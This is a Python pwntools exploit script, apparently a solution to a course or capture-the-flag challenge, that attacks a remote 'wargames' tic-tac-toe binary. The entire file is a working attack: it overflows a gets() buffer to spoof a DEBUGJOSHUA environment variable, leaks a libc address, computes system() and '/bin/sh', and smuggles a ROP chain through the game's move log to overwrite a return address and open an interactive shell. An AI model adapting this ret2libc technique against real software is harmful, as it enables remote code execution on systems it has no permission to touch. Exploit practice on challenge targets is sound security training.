# wargames-reloadedex.py - Aidan Wech (Onyxymous)
from pwn import *
import time

# debug info
bin64 = './wargames'
elf = ELF(bin64)
context.binary = elf
context.log_level = 'debug'

# remote variables
host = 'cs4401shell2.walls.ninja'
port = 14165

# exploit variables
debugjoshaddr = 0x40162b	# Location in code memory where DEBUGJOSHUA=1 is displayed
poprdigadget = 0x401503		# pop rdi gadget for ROP chain
retgadget = 0x400836		# ret gardget to solve movaps issue
offsettoenviron = 272		# Distance from the gets() call to the environ[] array
systemoffset = 0x2d799		# Offset to libc system
binshoffset = 0x192101		# Offset to /bin/sh string

# exploit strings
# this exploit string tricks the environ[] array that it has an environment variable called DEBUGJOSHUA, using the address of the built-in string in the binary
exploit1 = flat({
0: b'zero',
offsettoenviron: b'\x00' * 8}, p64(debugjoshaddr))

p = remote(host, port)
time.sleep(4)
p.recvline(timeout=1)		# Shall we play a game?
p.send(b'\n')

time.sleep(1.1)
p.recvline(timeout=1)		# How about GTW?
p.send(b'N')

time.sleep(1.2)
p.recvline(timeout=1)		# How about a nice game of TTT?
p.send(b'\n')

time.sleep(1)
p.recvline(timeout=1)		# How many players?
p.sendline(exploit1)

# get libc address, calculate system() and /bin/sh
libcret = int(p.recvline(timeout=1).strip().decode('utf-8')[6:], 16)
system = libcret + systemoffset
binsh = libcret + binshoffset
log.info(f'Libc Main Return Address: {hex(libcret)}')
log.info(f'System Address:           {hex(system)}')
log.info(f'/bin/sh Address:          {hex(binsh)}')

# split the addresses into row and column numbers for the first three moves
binshr = binsh & 0xffffffff
binshc = (binsh >> 32) & 0xffffffff
systemr = system & 0xffffffff
systemc = (system >> 32) & 0xffffffff
log.info(f'Binshr:                   {hex(binshr)}')
log.info(f'Binshc:                   {hex(binshc)}')
log.info(f'Systemr:                  {hex(systemr)}')
log.info(f'Systemc:                  {hex(systemc)}')

# insert pop rdi gadget, binsh address, and system address into first three slots of the move log
time.sleep(5)
p.recvuntil(b'? \n', timeout=1)
p.sendline(str(poprdigadget).encode('utf-8') + b' 0')
p.recvuntil(b'? \n', timeout=1)
p.sendline(str(binshr).encode('utf-8') + b' ' + str(binshc).encode('utf-8'))
p.recvuntil(b'? \n', timeout=1)
p.sendline(str(systemr).encode('utf-8') + b' ' + str(systemc).encode('utf-8'))

# fill out the rest of the move log
for i in range(4, 10):
	p.recvuntil(b'? \n', timeout=1)
	p.sendline(str(i).encode('utf-8') + b' 0')

# overwrite i = -2, i will increment by 1 after this and set our array location to print_board()'s ret address
p.recvuntil(b'? \n', timeout=1)
p.sendline(b'10 -2')

# overwrite ret address with ret gadget
p.recvuntil(b'? \n', timeout=1)
p.sendline(str(retgadget).encode('utf-8') + b' 0')
p.interactive()
p.close()
